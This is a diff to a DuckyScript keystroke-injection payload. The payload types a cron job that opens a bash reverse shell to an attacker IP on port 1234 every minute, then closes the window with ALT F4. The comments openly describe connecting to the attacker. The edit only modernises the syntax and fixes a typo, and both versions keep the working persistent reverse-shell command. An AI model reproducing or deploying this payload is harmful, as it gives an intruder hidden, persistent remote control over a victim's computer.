@@ -8,10 +8,8 @@ ALT t
 
 REM Create cronjob to connect to attacker on port 1234
 REM The attacker IP will need to be set below
-STRING echo "* * * * * /bin/bash -c 'bash -i>& /dev/tcp/[IP]/1234 0>&1'" > cron
-ENTER
-STRING crontab -i cron
-ENTER
+STRINGLN echo "* * * * * /bin/bash -c 'bash -i>& /dev/tcp/[IP]/1234 0>&1'" > cron
+STRINGLN crontab -i cron
 
 REM Since the job has been created, we can close the window
-ALF F4
+ALT F4
